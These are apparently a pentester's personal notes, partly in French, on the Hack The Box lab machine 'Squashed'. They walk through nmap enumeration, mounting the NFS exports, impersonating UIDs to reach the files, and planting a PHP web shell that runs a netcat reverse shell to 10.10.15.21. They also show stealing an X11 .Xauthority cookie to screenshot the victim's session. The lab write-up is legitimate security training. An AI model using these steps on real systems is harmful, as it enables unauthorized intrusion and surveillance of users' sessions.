# Enum
# nmap
```
PORT      STATE    SERVICE          VERSION
22/tcp    open     ssh              OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp    open     http             Apache httpd 2.4.41 ((Ubuntu))
|http-server-header: Apache/2.4.41 (Ubuntu)
|http-title: Built Better
100/tcp   filtered newacct
111/tcp   open     rpcbind          2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      36561/udp6  mountd
|   100005  1,2,3      44767/tcp   mountd
|   100005  1,2,3      48893/tcp6  mountd
|   100005  1,2,3      57344/udp   mountd
|   100021  1,3,4      36230/udp6  nlockmgr
|   100021  1,3,4      36777/udp   nlockmgr
|   100021  1,3,4      38537/tcp6  nlockmgr
|   100021  1,3,4      39647/tcp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
668/tcp   filtered mecomm
1073/tcp  filtered bridgecontrol
1147/tcp  filtered capioverlan
2049/tcp  open     nfs              3-4 (RPC #100003)
2100/tcp  filtered amiganetfs
2492/tcp  filtered groove
6003/tcp  filtered X11:3
6669/tcp  filtered irc
9111/tcp  filtered DragonIDSConsole
19283/tcp filtered keysrvr
32768/tcp filtered filenet-tms
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

┌──(zelofane㉿Zelofane)-[~]
└─$ sudo nmap -sSUC -p111 10.129.228.109
```
	Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-26 11:44 UTC
	Nmap scan report for 10.129.228.109 (10.129.228.109)
	Host is up (0.14s latency).
	PORT    STATE SERVICE
	111/tcp open  rpcbind
	| rpcinfo:
	|   program version    port/proto  service
	|   100000  2,3,4        111/tcp   rpcbind
	|   100000  2,3,4        111/udp   rpcbind
	|   100003  3           2049/udp   nfs
	|   100003  3,4         2049/tcp   nfs
	|   100005  1,2,3      44767/tcp   mountd
	|   100005  1,2,3      57344/udp   mountd
	|   100021  1,3,4      36777/udp   nlockmgr
	|   100021  1,3,4      39647/tcp   nlockmgr
	|   100227  3           2049/tcp   nfs_acl
	|_  100227  3           2049/udp   nfs_acl
	111/udp open  rpcbind
	| rpcinfo:
	|   program version    port/proto  service
	|   100000  2,3,4        111/tcp   rpcbind
	|   100000  2,3,4        111/udp   rpcbind
	|   100003  3           2049/udp   nfs
	|   100003  3,4         2049/tcp   nfs
	|   100005  1,2,3      44767/tcp   mountd
	|   100005  1,2,3      57344/udp   mountd
	|   100021  1,3,4      36777/udp   nlockmgr
	|   100021  1,3,4      39647/tcp   nlockmgr
	|   100227  3           2049/tcp   nfs_acl
	|_  100227  3           2049/udp   nfs_acl
```

# Exploit possible
## *Can exploit nfs service*
└─# 
```
showmount -e 10.129.228.109
```
	Export list for 10.129.228.109:
	/home/ross    *
	/var/www/html *
└─# 
```
mount 10.129.228.109:/var/www/html /mnt/htb -t nfs -o nolock -o v3
```
└─# ll
drwxr-xr-- 5 *2017* www-data 4096 Jun 26 17:40 htb_html
_UID = 2017 : c'est intéressant_ 

└─# ll htb_html                                                            
```
	ls: cannot access '/mnt/htb/index.html': Permission denied
	ls: cannot access '/mnt/htb/images': Permission denied
	ls: cannot access '/mnt/htb/css': Permission denied
	ls: cannot access '/mnt/htb/js': Permission denied
	total 0
	?????????? ? ? ? ?            ? css
	?????????? ? ? ? ?            ? images
	?????????? ? ? ? ?            ? index.html
	?????????? ? ? ? ?            ? js
```
_Donc je dois avoir les droit_
└─#
```
mount 10.129.228.109:/home/ross /mnt/htb_ross
```
└─# ll /mnt/htb_ross                                                         
```
	total 32
	drwxr-xr-x 2 1001 1001 4096 Oct 21  2022 Desktop
	drwxr-xr-x 2 1001 1001 4096 Oct 21  2022 Documents
	drwxr-xr-x 2 1001 1001 4096 Oct 21  2022 Downloads
	drwxr-xr-x 2 1001 1001 4096 Oct 21  2022 Music
	drwxr-xr-x 2 1001 1001 4096 Oct 21  2022 Pictures
	drwxr-xr-x 2 1001 1001 4096 Oct 21  2022 Public
	drwxr-xr-x 2 1001 1001 4096 Oct 21  2022 Templates
	drwxr-xr-x 2 1001 1001 4096 Oct 21  2022 Videos
```

└─# ll *
```
	Desktop:
	total 0
	
	Documents:
	total 4
	-rw-rw-r-- 1 1001 1001 1365 Oct 19  2022 Passwords.kdbx
	[...]
```
*les fichiers .kdbx de v4 ne sont pas cassables*
## *Access aux dossiers htb_html*
### Creat new user whith UID = 2017
### Create shell.php in htb_html as new user
$ cd /mnt/htb_html
```
echo '<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.21 1234 >/tmp/f"); ?>' > shell.php
```

# FootHold
## _ross imitation_
└─#(local)  
```
useradd zelo1
```
```
usermod -u 1001 zelo1
```
```
groupmod -g 1001 zelo1
```

zelo1@Zelofane:/mnt/htb/htb_ross$ ls -la
```
	drwxr-xr-x 14 zelo1 docker 4096 Jun 26 11:16 .
	drwxr-xr-x  4 root  root   4096 Jun 26 21:55 ..
	lrwxrwxrwx  1 root  root      9 Oct 20  2022 .bash_history -> /dev/null
	drwx------ 11 zelo1 docker 4096 Oct 21  2022 .cache
	drwx------ 12 zelo1 docker 4096 Oct 21  2022 .config
	drwxr-xr-x  2 zelo1 docker 4096 Oct 21  2022 Desktop
	drwxr-xr-x  2 zelo1 docker 4096 Oct 21  2022 Documents
	drwxr-xr-x  2 zelo1 docker 4096 Oct 21  2022 Downloads
	drwx------  3 zelo1 docker 4096 Oct 21  2022 .gnupg
	drwx------  3 zelo1 docker 4096 Oct 21  2022 .local
	drwxr-xr-x  2 zelo1 docker 4096 Oct 21  2022 Music
	drwxr-xr-x  2 zelo1 docker 4096 Oct 21  2022 Pictures
	drwxr-xr-x  2 zelo1 docker 4096 Oct 21  2022 Public
	drwxr-xr-x  2 zelo1 docker 4096 Oct 21  2022 Templates
	drwxr-xr-x  2 zelo1 docker 4096 Oct 21  2022 Videos
	lrwxrwxrwx  1 root  root      9 Oct 21  2022 .viminfo -> /dev/null
	-rw-------  1 zelo1 docker   57 Jun 26 11:16 .Xauthority
	-rw-------  1 zelo1 docker 2475 Jun 26 11:16 .xsession-errors
	-rw-------  1 zelo1 docker 2475 Dec 27 15:33 .xsession-errors.old
```
## *stealing X cookie*
[zelo1@Zelofane:/mnt/htb/htb_ross$ ]
```
cat .Xauthority | base64
```
```
AQAADHNxdWFzaGVkLmh0YgABMAASTUlULU1BR0lDLUNPT0tJRS0xABAxPV7JYeXe7VJkENX3doSg
```

[alex@squashed:/home/ross/Documents$ ]
```
echo "AQAADHNxdWFzaGVkLmh0YgABMAASTUlULU1BR0lDLUNPT0tJRS0xABAxPV7JYeXe7VJkENX3doSg" | base65 -d > /tmp/.Xauthority
```
[alex@squashed:/home/ross/Documents$]
```
export XAUTHORITY=/tmp/.Xauthority
```
[alex@squashed:/home/ross/Documents$] w 
```
22:44:21 up 11:28,  1 user,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
ross     tty7     :0               11:16   11:28m  1:35   0.03s /usr/libexec/gnome-session-binary --systemd --session=gnome
```

[alex@squashed:/home/ross/Documents$] (screenshot of displaying session)
```
xwd -root -screen -silent -display :0 > /tmp/screen.xwd
```